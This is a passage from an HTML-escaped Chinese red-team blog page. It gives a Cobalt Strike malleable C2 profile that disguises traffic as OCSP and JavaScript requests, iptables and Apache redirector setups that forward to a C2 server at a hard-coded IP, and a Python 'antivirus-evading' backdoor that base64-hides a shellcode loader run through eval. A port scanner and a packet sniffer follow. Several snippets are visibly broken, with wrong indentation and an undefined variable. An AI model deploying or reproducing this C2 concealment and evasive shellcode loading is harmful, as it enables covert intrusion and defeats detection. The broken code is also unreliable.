Trident/5.0)&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http-get &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  set uri &amp;quot;/api/x&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  client &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    header &amp;quot;Accept&amp;quot; &amp;quot;*/*&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    metadata &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      base64;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      prepend &amp;quot;SESSIONID=&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      header &amp;quot;Cookie&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  server &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    header &amp;quot;Content-Type&amp;quot; &amp;quot;application/ocsp-response&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    header &amp;quot;content-transfer-encoding&amp;quot; &amp;quot;binary&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    header &amp;quot;Server&amp;quot; &amp;quot;Nodejs&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    output &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      base64;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http-stager &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  set uri_x86 &amp;quot;/vue.min.js&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  set uri_x64 &amp;quot;/bootstrap-2.min.js&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http-post &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  set uri &amp;quot;/api/y&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  client &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    header &amp;quot;Accept&amp;quot; &amp;quot;*/*&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    id &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       base64;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       prepend &amp;quot;JSESSION=&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       header &amp;quot;Cookie&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    output &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       base64;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       print;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  server &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    header &amp;quot;Content-Type&amp;quot; &amp;quot;application/ocsp-response&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    header &amp;quot;content-transfer-encoding&amp;quot; &amp;quot;binary&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    header &amp;quot;Connection&amp;quot; &amp;quot;keep-alive&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    output &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      base64;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;启动 CS 加载 profile：./teamserver IP 密码 xxx.profile&lt;/p&gt;
&lt;p&gt;（ 5 ）端口转发 - Iptables&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;转发机设置转发：(80改 443 即https)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 47.94.236.117:80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -t nat -A POSTROUTING -j MASQUERADE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -I FORWARD -j ACCEPT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -P FORWARD ACCEPT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sysctl net.ipv4.ip_forward=1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;CS 监听器配置转发机 IP&lt;/p&gt;
&lt;p&gt;（ 6 ）中间件反向代理 - Apache&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;代理机安装Apache：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;apt-get install apache2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a2enmod proxy proxy_ajp proxy_balancer proxy_connect proxy_http&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;systemctl restart apache2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/etc/apache2/sites-enabled/000-default.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;中间件设置转发：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ProxyPass &amp;quot;/&amp;quot; &amp;quot;http://CS的IP/&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ProxyPassReverse &amp;quot;/&amp;quot; &amp;quot;http://CS的IP/&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ProxyPass &amp;quot;/&amp;quot; &amp;quot;https://CS的IP/&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ProxyPassReverse &amp;quot;/&amp;quot; &amp;quot;https://CS的IP/&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;重启Apache服务：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;service apache2 restart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;CS监听器配置转发机IP&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;python自动化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python自动化&#34;&gt;#&lt;/a&gt; python 自动化&lt;/h3&gt;
&lt;h4 id=&#34;socket免杀后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#socket免杀后门&#34;&gt;#&lt;/a&gt; socket 免杀后门&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;client.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import socket,sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ip=sys.argv[1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;port=sys.argv[2]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s1=socket.socket()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s1.connect((ip,int(port)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;while True:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cmdline=input(&amp;#x27;please input cmdline:&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  s1.send(cmdline.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cmddata=s1.recv(1024).decode()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  print(cmddata)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  s1.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;server.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import socket,os,ctypes,base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s=socket.socket()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s.bind((&amp;#x27;0.0.0.0&amp;#x27;,9999))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s.listen(5)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def zx(s):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sc = base64.b64decode(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  code=&amp;#x27;cnd4cGFnZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKDAsIGxlbihzYyksIDB4MTAwMCwgMHg0MCkKY3R5cGVzLndpbmRsbC5r ZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3 RyaW5nX2J1ZmZlcihzYyksIGxlbihzYykpCmhhbmRsZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ3JlYXRlVGhyZWFkKDAsIDAsIHJ3eHBhZ2UsIDAsIDAsIDA pCmN0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChoYW5kbGUsIC0xKQ==&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  c=base64.b64decode(code)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  eval(c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  while 1:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sock,addr=s.accept()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(sock, addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  while 1:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cmd=sock.recv(10241).decode()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(cmd)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(type(cmd))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    zx(cmd)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(cmd_data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(type(cmd_data))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sock.send(cmd_data.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sock.close()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;多线程全端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#多线程全端口扫描&#34;&gt;#&lt;/a&gt; 多线程全端口扫描&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import threading&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import queue&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def port_scan():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  while not q.empty():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ip = &amp;#x27;127.0.0.1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    port = q.get()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s = socket.socket()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if s.connect_ex((ip, port)) == 0:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print(&amp;quot;%d is open&amp;quot; %port)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  q = queue.Queue()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  for port in range(1,65536):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    q.put(port)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      for i in range(30):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      t = threading.Thread(target=port_scan)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      t.start()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;scapy流量分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#scapy流量分析&#34;&gt;#&lt;/a&gt; scapy 流量分析&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from scapy.all import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def packet_callback(packet):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  print(packet.show())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  data=bytes(packet[TCP].payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for info in data.split(b&amp;#x27;\n&amp;#x27;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(info)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if b&amp;#x27;Content-Disposition: form-data; name=&amp;quot;&amp;#x27; in info:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print(&amp;#x27;文件上传攻击中...&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sniff(filter=&amp;#x27;host 192.168.1.107 and tcp port 80&amp;#x27;,iface=&amp;#x27;以太网&amp;#x27;,prn=packet_callback,store=0)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;文件行为监控&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件行为监控&#34;&gt;#&lt;/a&gt; 文件行为监控&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span 